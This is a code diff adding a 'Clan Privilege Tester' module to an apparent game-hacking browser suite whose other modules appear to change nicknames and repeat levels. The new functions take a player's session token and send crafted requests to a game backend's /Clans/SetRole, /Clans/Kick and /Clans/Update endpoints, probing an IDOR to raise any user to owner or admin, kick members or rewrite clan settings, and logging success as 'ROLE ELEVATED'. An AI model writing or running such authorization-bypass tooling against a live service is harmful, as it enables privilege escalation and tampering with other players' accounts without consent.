@@ -678,6 +678,202 @@ function startNickChanger(rawToken, newNick, delayMs) {
 }
 
 // ==========================================
+// MODULE 6: CLAN / CLUB PRIVILEGE TESTER
+// ==========================================
+const CLAN_ROLES = {
+  0: 'Creator (Owner)',
+  1: 'Deputy (Admin)',
+  2: 'Member'
+};
+
+const CLAN_ERRORS = {
+  0: 'Success',
+  1: 'ClanNotFound',
+  2: 'UserNotFound',
+  3: 'AlreadyInClan',
+  4: 'NotInClan',
+  5: 'InsufficientPermissions (BLOCKED BY SERVER)',
+  6: 'ClanFull',
+  7: 'UserLevelTooLow',
+  8: 'ClanNameExists',
+  9: 'InvalidClanName',
+  10: 'InvitationNotFound',
+  11: 'AlreadyInvited',
+  12: 'CannotInviteSelf',
+  13: 'CannotLeaveAsCreator',
+  14: 'CannotKickCreator',
+  15: 'NotEnoughResource',
+  16: 'UnknownError',
+  17: 'InvalidConfirmationCode',
+  18: 'InvalidRole',
+  19: 'ClanIsPrivate'
+};
+
+async function inspectMyClan(token) {
+  const normalizedToken = formatToken(token);
+  if (!normalizedToken) return alert('Please enter your session token.');
+
+  appendLog('clanConsole', '🔍 Fetching clan details via /Clans/GetMyClan...', 'cyan');
+  document.getElementById('clanStatus').textContent = 'Fetching...';
+
+  try {
+    const resp = await fetchEndpoint(`${CONFIG.battleApi}/Clans/GetMyClan`, {
+      method: 'POST',
+      body: `VersId=${CONFIG.versIdBattle}&token=${encodeURIComponent(normalizedToken)}`
+    });
+    const data = await resp.json();
+
+    if (data.error !== 0 && data.ErrorCode && data.ErrorCode !== 0) {
+      appendLog('clanConsole', `❌ GetMyClan failed: ${CLAN_ERRORS[data.ErrorCode] || data.ErrorCode}`, 'error');
+      document.getElementById('clanStatus').textContent = 'Error';
+      return;
+    }
+
+    const clan = data.value || data;
+    if (!clan || (!clan.Id && !clan.Name)) {
+      appendLog('clanConsole', `ℹ️ Response: ${JSON.stringify(data)}`, 'warn');
+      appendLog('clanConsole', '⚠ No active clan found for this account (NotInClan).', 'warn');
+      document.getElementById('clanStatus').textContent = 'Not in Clan';
+      return;
+    }
+
+    // Populate UI
+    document.getElementById('clanInfoCard').classList.remove('hidden');
+    document.getElementById('clanCardName').textContent = `🛡️ ${clan.Name || 'Unnamed Clan'}`;
+    document.getElementById('clanCardId').textContent = `ID: ${clan.Id || clan.ClanId || '-'}`;
+    document.getElementById('clanCardOwner').textContent = clan.OwnerId || clan.CreatorId || clan.UserId || '-';
+    document.getElementById('clanCardMinLevel').textContent = clan.MinLevelToJoin ?? '-';
+
+    const members = clan.Members || [];
+    document.getElementById('clanCardMembersCount').textContent = members.length || '-';
+
+    const membersListEl = document.getElementById('clanMembersList');
+    membersListEl.innerHTML = '';
+
+    members.forEach(m => {
+      const roleStr = CLAN_ROLES[m.Role] || `Role ${m.Role}`;
+      const div = document.createElement('div');
+      div.className = 'flex items-center justify-between py-1 px-2 rounded bg-black/40 border border-white/5';
+      div.innerHTML = `
+        <span><strong>${m.Nick || m.Name || 'UID: ' + m.UserId}</strong> (${m.UserId})</span>
+        <span class="${m.Role === 0 ? 'text-amber-400 font-bold' : m.Role === 1 ? 'text-cyan-400 font-bold' : 'text-slate-400'}">${roleStr}</span>
+      `;
+      membersListEl.appendChild(div);
+    });
+
+    appendLog('clanConsole', `✅ Clan "${clan.Name}" loaded. Total members: ${members.length}`, 'success');
+    document.getElementById('clanStatus').textContent = 'Loaded';
+  } catch (err) {
+    appendLog('clanConsole', `❌ Network error inspecting clan: ${err.message}`, 'error');
+    document.getElementById('clanStatus').textContent = 'Network Error';
+  }
+}
+
+async function probeClanSetRole(token, targetUserId, targetRole) {
+  const normalizedToken = formatToken(token);
+  if (!normalizedToken) return alert('Please enter your session token.');
+  if (!targetUserId) return alert('Please enter a target User ID.');
+
+  const roleName = CLAN_ROLES[targetRole] || targetRole;
+  appendLog('clanConsole', `⚡ Probing IDOR: Setting User ${targetUserId} to Role ${targetRole} (${roleName})...`, 'cyan');
+  document.getElementById('clanStatus').textContent = 'Probing...';
+
+  const finishPayload = `data=${encodeURIComponent(JSON.stringify({
+    UserId: Number(targetUserId),
+    Role: Number(targetRole)
+  }))}&VersId=${CONFIG.versIdBattle}&token=${encodeURIComponent(normalizedToken)}`;
+
+  try {
+    const resp = await fetchEndpoint(`${CONFIG.battleApi}/Clans/SetRole`, {
+      method: 'POST',
+      body: finishPayload
+    });
+    const data = await resp.json();
+
+    const errCode = data.ErrorCode ?? data.error ?? 0;
+    const errText = CLAN_ERRORS[errCode] || `Error ${errCode}`;
+
+    if (errCode === 0) {
+      appendLog('clanConsole', `🔥 [VULNERABILITY FOUND] Server accepted SetRole! User ${targetUserId} granted ${roleName} on database!`, 'success');
+      document.getElementById('clanStatus').textContent = 'ROLE ELEVATED!';
+    } else if (errCode === 5) {
+      appendLog('clanConsole', `🛡️ [SECURE] ErrorCode 5 (${errText}) — Server enforces role checks. Requester is not Creator/Deputy.`, 'warn');
+      document.getElementById('clanStatus').textContent = 'Blocked (Auth 5)';
+    } else {
+      appendLog('clanConsole', `❌ Response: ${errText} (${JSON.stringify(data)})`, 'error');
+      document.getElementById('clanStatus').textContent = `Code ${errCode}`;
+    }
+  } catch (err) {
+    appendLog('clanConsole', `❌ Network error: ${err.message}`, 'error');
+    document.getElementById('clanStatus').textContent = 'Network Error';
+  }
+}
+
+async function probeClanKick(token, targetUserId) {
+  const normalizedToken = formatToken(token);
+  if (!normalizedToken) return alert('Please enter your session token.');
+  if (!targetUserId) return alert('Please enter a target User ID to kick.');
+
+  appendLog('clanConsole', `👢 Probing Kick authorization against User ${targetUserId}...`, 'cyan');
+  document.getElementById('clanStatus').textContent = 'Probing Kick...';
+
+  try {
+    const resp = await fetchEndpoint(`${CONFIG.battleApi}/Clans/Kick`, {
+      method: 'POST',
+      body: `targetUserId=${encodeURIComponent(targetUserId)}&VersId=${CONFIG.versIdBattle}&token=${encodeURIComponent(normalizedToken)}`
+    });
+    const data = await resp.json();
+    const errCode = data.ErrorCode ?? data.error ?? 0;
+    const errText = CLAN_ERRORS[errCode] || `Error ${errCode}`;
+
+    if (errCode === 0) {
+      appendLog('clanConsole', `🔥 User ${targetUserId} was kicked by server!`, 'success');
+      document.getElementById('clanStatus').textContent = 'Kicked';
+    } else {
+      appendLog('clanConsole', `🛡️ Kick denied: ${errText} (Code: ${errCode})`, 'warn');
+      document.getElementById('clanStatus').textContent = `Blocked (${errCode})`;
+    }
+  } catch (err) {
+    appendLog('clanConsole', `❌ Error: ${err.message}`, 'error');
+  }
+}
+
+async function probeClanUpdate(token) {
+  const normalizedToken = formatToken(token);
+  if (!normalizedToken) return alert('Please enter your session token.');
+
+  appendLog('clanConsole', '📝 Probing /Clans/Update permission...', 'cyan');
+  document.getElementById('clanStatus').textContent = 'Probing Update...';
+
+  const updateBody = {
+    Description: 'Tested via Fortzone Suite',
+    ImageId: 1,
+    IsPrivate: false,
+    MinLevelToJoin: 1
+  };
+
+  try {
+    const resp = await fetchEndpoint(`${CONFIG.battleApi}/Clans/Update`, {
+      method: 'POST',
+      body: `data=${encodeURIComponent(JSON.stringify(updateBody))}&VersId=${CONFIG.versIdBattle}&token=${encodeURIComponent(normalizedToken)}`
+    });
+    const data = await resp.json();
+    const errCode = data.ErrorCode ?? data.error ?? 0;
+    const errText = CLAN_ERRORS[errCode] || `Error ${errCode}`;
+
+    if (errCode === 0) {
+      appendLog('clanConsole', '🔥 Clan settings updated on database!', 'success');
+      document.getElementById('clanStatus').textContent = 'Updated';
+    } else {
+      appendLog('clanConsole', `🛡️ Update denied: ${errText} (Code: ${errCode})`, 'warn');
+      document.getElementById('clanStatus').textContent = `Blocked (${errCode})`;
+    }
+  } catch (err) {
+    appendLog('clanConsole', `❌ Error: ${err.message}`, 'error');
+  }
+}
+
+// ==========================================
 // EVENT LISTENERS & INITIALIZATION
 // ==========================================
 document.addEventListener('DOMContentLoaded', () => {
@@ -721,6 +917,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('wingsToken').value = t;
     document.getElementById('charsToken').value = t;
     document.getElementById('nickToken').value = t;
+    if (document.getElementById('clanToken')) document.getElementById('clanToken').value = t;
   }
   if (urlParams.get('repeat')) document.getElementById('lvlRepeat').value = urlParams.get('repeat');
 
@@ -883,6 +1080,27 @@ document.addEventListener('DOMContentLoaded', () => {
   });
   document.getElementById('btnCloseNickHelp').addEventListener('click', () => {
     modalNickHelp.classList.add('hidden');
+  });
+
+  // Clan Privilege Tester Tab setup
+  document.getElementById('btnClanGetInfo')?.addEventListener('click', () => {
+    const token = document.getElementById('clanToken').value.trim();
+    inspectMyClan(token);
+  });
+  document.getElementById('btnClanSetRole')?.addEventListener('click', () => {
+    const token = document.getElementById('clanToken').value.trim();
+    const targetId = document.getElementById('clanTargetUserId').value.trim();
+    const targetRole = document.getElementById('clanTargetRole').value;
+    probeClanSetRole(token, targetId, targetRole);
+  });
+  document.getElementById('btnClanKick')?.addEventListener('click', () => {
+    const token = document.getElementById('clanToken').value.trim();
+    const targetId = document.getElementById('clanTargetUserId').value.trim();
+    probeClanKick(token, targetId);
+  });
+  document.getElementById('btnClanUpdate')?.addEventListener('click', () => {
+    const token = document.getElementById('clanToken').value.trim();
+    probeClanUpdate(token);
   });
 
   // Config Modal
